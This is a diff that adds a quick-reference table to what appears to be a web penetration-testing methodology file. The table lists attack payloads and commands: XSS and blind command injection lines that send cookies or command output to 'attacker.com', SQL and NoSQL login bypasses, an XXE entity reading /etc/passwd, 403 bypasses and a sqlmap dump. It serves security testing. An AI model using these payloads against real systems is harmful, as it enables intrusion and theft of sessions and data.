@@ -790,6 +790,30 @@ use <module>
 
 ---
 
+## Quick Reference
+
+| Goal | Command / Payload |
+|---|---|
+| Encode/decode payload chars | `python3 -c "import urllib.parse; print(urllib.parse.quote(\"' OR 1=1--\"))"` |
+| Grep downloaded source for secrets | `grep -rn "password\|secret\|api_key\|TODO" ./source/` |
+| Scan JS/source for leaked secrets | `trufflehog filesystem ./source/` / `gitleaks detect --source=./source/ --no-git` |
+| Basic XSS PoC | `<script>document.location='http://attacker.com/log?c='+document.cookie</script>` |
+| CSRF PoC (POST) | Auto-submitting hidden form to target endpoint with victim's cookies |
+| NoSQL login bypass (MongoDB) | `{"username": {"$ne": null}, "password": {"$ne": null}}` |
+| REST endpoint discovery | `ffuf -u http://target.com/api/FUZZ -w api-endpoints.txt` |
+| IDOR test | `GET /api/users/1` → `GET /api/users/2` |
+| SOAP XXE | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in SOAP envelope prolog |
+| Auth bypass via SQLi | `Username: admin'--` or `' OR 1=1--` |
+| 403 bypass | `curl http://target.com/admin/. ` / `-H "X-Original-URL: /admin"` |
+| Command injection test | `; id` `\| id` `` `id` `` `$(id)` |
+| Blind command injection | `; sleep 5` or `; curl http://attacker.com/?o=$(id\|base64)` |
+| SQLi detection | `'` `''` `' OR '1'='1` |
+| SQLi automated dump | `sqlmap -u "http://target.com/search?q=test" --dbs` |
+| Find known CVEs for a version | `searchsploit <application> <version>` |
+| Fingerprint framework/stack | `whatweb http://target.com` |
+
+---
+
 *Created: 2026-04-24*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-27*
+*Model: claude-sonnet-5*
